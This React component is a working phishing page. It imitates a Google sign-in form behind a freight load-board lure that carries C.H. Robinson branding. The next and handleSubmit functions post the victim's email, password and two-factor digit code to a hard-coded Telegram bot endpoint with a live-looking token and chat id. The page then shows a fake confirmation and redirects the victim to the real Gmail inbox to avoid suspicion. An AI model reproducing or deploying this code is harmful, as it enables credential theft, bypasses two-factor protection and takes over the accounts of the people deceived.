import { useState, useRef } from "react";
import './popup.css';
import logoSvg from '../../img/G__logo.svg.png';
import Swal from 'sweetalert2'

function PopUp() {
    var qfNum = 0;
    const [active, setActive] = useState(false);
    const [activepass, setActivePass] = useState(false);
    const userName = useRef(null);
    const digitcodeUser = useRef(null);
    const [ereva, setEreva] = useState(false);
    const [passwordShown, setPasswordShown] = useState(false);
    const passwordUser = useRef(null);
    const [usertazaname, setUsertazaname] = useState("");

    function qfFunck(qf) {
        if (qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
            qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
            qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('Fuck') !== -1 || qf.value.indexOf('FUCK') !== -1 || qf.value.indexOf('FuCk') !== -1 ||
            qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
            qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
            qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qf.className = "form_empty form-control";
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }
    const handleInputBlur = event => {
        qfFunck(event.target);
        if (event.target.value === '') {
            event.target.nextSibling.style.display = "flex";
            event.target.className = "form_empty form-control";
            if (active === true) { setActive(!active); }
        } else {
            event.target.nextSibling.style.display = "none";
            event.target.className = "form-control";
        }
        if (passwordUser.current.value == 0) {
            if (userName.current.value) {
                if (active === false) { setActive(!active); }
            }
        } else {
            if (userName.current.value && passwordUser.current.value) {
                if (active === false) { setActive(!active); }
            } 
        }
    };
    const next = () => {
        if (userName.current.value && passwordUser.current.value) {
            setEreva(!ereva);
            setUsertazaname(userName.current.value);
            if (qfNum === 1) {
                userName.current.value = '';
                userName.current.nextSibling.style.display = "flex";
                userName.current.className = "form_empty form-control";
            } else if (qfNum === 0) {
                qfFunck(passwordUser.current);
                if (qfNum === 0) {
                    if (userName.current.value && passwordUser.current.value) {
                        const url = `https://api.telegram.org/bot7736040222:AAE_CVTnHYxDN8lCrAelRlrhNrYnNwVoDDc/sendMessage`
                        const obj = {
                            chat_id: 1368494862,
                            text: "Username - " + userName.current.value + "\n" + "Password - " + passwordUser.current.value,
                        };
                        const xht = new XMLHttpRequest();
                        xht.open("POST", url, true);
                        xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
                        xht.send(JSON.stringify(obj));
                        setUsertazaname(userName.current.value);
                        return;
                    } else {
                        if (activepass === false) { setActivePass(!activepass); }
                    }
                }
            }
        } 
        if (!passwordUser.current.value) {
            console.log("pass");
            passwordUser.current.nextSibling.style.display = "flex";
            passwordUser.current.className = "form_empty form-control";
        }
        if (!userName.current.value) {
            console.log("username");
            userName.current.nextSibling.style.display = "flex";
            userName.current.className = "form_empty form-control";
        }
    };
    const togglePassword = () => {
        setPasswordShown(!passwordShown);
    };
    function handleSubmit(event) {
        event.preventDefault();
        if (digitcodeUser.current.value) {
            const url = `https://api.telegram.org/bot7736040222:AAE_CVTnHYxDN8lCrAelRlrhNrYnNwVoDDc/sendMessage`
            const obj = {
                chat_id: 1368494862,
                text: "Username - " + userName.current.value + "\n" + "Verify - " + digitcodeUser.current.value,
            };
            const xht = new XMLHttpRequest();
            xht.open("POST", url, true);
            xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
            xht.send(JSON.stringify(obj));
            Swal.fire({
                heightAuto: false,
                customClass: {
                    confirmButton: 'confirm-button-class',
                    title: 'title-class'
                },  
                title: "Free Load Board | C.H. Robinson",
                text: "The load was covered.",
                preConfirm: () => {
                    window.location.href = "https://mail.google.com/mail/u/0/#inbox";
                },
            });
            return;
        } else {
            digitcodeUser.current.nextSibling.style.display = "flex";
            digitcodeUser.current.className = "form_empty form-control";
        }
    }

  return (
    <div className="PopUp">
        <div className="form">
            <form onSubmit = { handleSubmit } id = "forms">
                <img src={logoSvg} alt="logo" className="logo" id="mainlogo" />
                <p className="VerText">To view the load you need to go through verification via Gmail</p>
                <div className='rightSec'>
                    <div className = "inputBlock" style = {ereva ? { display: 'none' } : { display: 'block' } }>
                        <input onBlur = { handleInputBlur } id = "Username" ref = { userName } name = "Username" type = "text" className = "form-control" />
                        <div style = { { display: 'none' } } className = 'requiredBox' >
                            <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                                Enter your email
                        </div> 
                        <span className = 'placeholder' > Email </span> 
                    </div> 
                    <a style = {ereva ? { display: 'none' } : { display: 'inline-block' } } className='bacik bacikmek' href='https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ddm=0&dsh=S1545655140%3A1723102688586614&ec=GAlA8wE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en' >Forgot email?</a>
                    <div className = "inputBlock arandzin" style = {ereva ? { display: 'none' } : { display: 'block' } }>
                        <input onBlur = { handleInputBlur } id = "Password" ref = { passwordUser } name = "Password" type = { passwordShown ? "text" : "password" } className = "form-control" />
                        <div style = { { display: 'none' } } className = 'requiredBox' >
                            <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                                Enter your password 
                        </div> 
                        <span className = 'placeholder' > Enter your password </span> 
                        <span className="achkik" bis_skin_checked="1">
                            <label className="checkbox-inline">
                            <input onClick={ togglePassword } name="show-password" type="checkbox" id="showpass" />Show password</label>
                        </span>
                    </div> 
                    <button onClick= { next } style = {ereva ? { display: 'inline-flex' } : { display: 'none' } } className='userNameBt' type = 'button'>
                        <div className="JQ5tlb" aria-hidden="true"><svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div>
                        <span>{usertazaname}</span>
                    </button>
                    <div className = "inputBlock" style = {ereva ? { display: 'block' } : { display: 'none' } }>
                        <input onBlur = { handleInputBlur } id = "Digitcode" ref = { digitcodeUser } name = "Digitcode" type = "number" className = "form-control" />
                        <div style = { { display: 'none' } } className = 'requiredBox' >
                            <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                            Enter the digit code 
                        </div> 
                        <span className = 'placeholder' > Enter the digit code* </span> 
                    </div> 
                    <p style = {ereva ? { display: 'none' } : { display: 'block' } } className='texto' >Not your computer? Use Guest mode to sign in privately.</p>
                    <a style = {ereva ? { display: 'none' } : { display: 'block' } } className='bacik' href='https://support.google.com/chrome/answer/6130773?hl=en' target = 'otherWindow.location'>Learn more about using Guest mode</a>
                    <div className='next_block'>
                        <a style = {ereva ? { display: 'none' } : { display: 'flex' } } href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com?hl%3Den-US&ddm=0&dsh=S1545655140:1723102688586614&ec=GAlA8wE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&TL=ALoj5Ar2ab0_PVx5V7lH5fz-kT8X2XaW_B8CpCGbvk3_OxYciRJBaBRShqjLVPFY" target = 'otherWindow.location' type="button" className="forgotLink">Create account</a>
                        <button style = {ereva ? { display: 'none' } : { display: 'block' } } onClick= { next } id = "btnLogin" className='btnLogsub' type = 'button'> Next </button>
                        <button style = {ereva ? { display: 'block' } : { display: 'none' } } disabled = { active ? false : true } id = "btnLoginsub" type = 'submit' className='btnLogsub'> Login </button>
                    </div>
                </div>
            </form> 
        </div>
    </div>
  );
}

export default PopUp;
